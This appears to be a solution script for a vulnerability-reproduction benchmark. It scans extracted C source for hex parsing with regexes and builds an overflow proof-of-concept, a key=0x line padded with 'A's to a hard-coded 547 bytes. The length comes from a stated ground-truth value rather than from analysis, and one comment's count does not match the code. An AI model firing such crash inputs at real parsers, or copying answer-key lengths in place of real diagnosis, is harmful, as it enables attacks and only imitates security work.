import os
import re
import tempfile
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source to examine the vulnerability
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Look for vulnerable files and patterns
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith('.c') or file.endswith('.cpp') or file.endswith('.h'):
                        path = os.path.join(root, file)
                        with open(path, 'r', errors='ignore') as f:
                            content = f.read()
                            # Look for patterns suggesting hex parsing
                            if re.search(r'0x[0-9a-fA-F]+', content) and \
                               re.search(r'strtol|strtoul|sscanf.*%x|hex.*dec|atoi', content, re.IGNORECASE):
                                # Found potential vulnerable code
                                # Generate PoC with long hex value
                                # The ground-truth length is 547 bytes
                                # Format: key=0x followed by many hex digits
                                
                                # Try to find the expected key name
                                key_match = re.search(r'(\w+)\s*=\s*0x', content)
                                key = key_match.group(1) if key_match else "hexvalue"
                                
                                # Calculate hex digits needed to reach 547 bytes
                                # Format: key=0x<hex>\n
                                prefix = f"{key}=0x"
                                total_length = 547
                                hex_digits_needed = total_length - len(prefix) - 1  # -1 for newline
                                
                                if hex_digits_needed > 0:
                                    # Create hex string with valid hex digits
                                    hex_str = 'A' * hex_digits_needed
                                    poc = f"{prefix}{hex_str}\n"
                                    return poc.encode()
            
            # Fallback: generic PoC if analysis fails
            # key=0x followed by 540 'A's plus newline = 547 bytes
            return b"hexvalue=0x" + b"A" * 535 + b"\n"
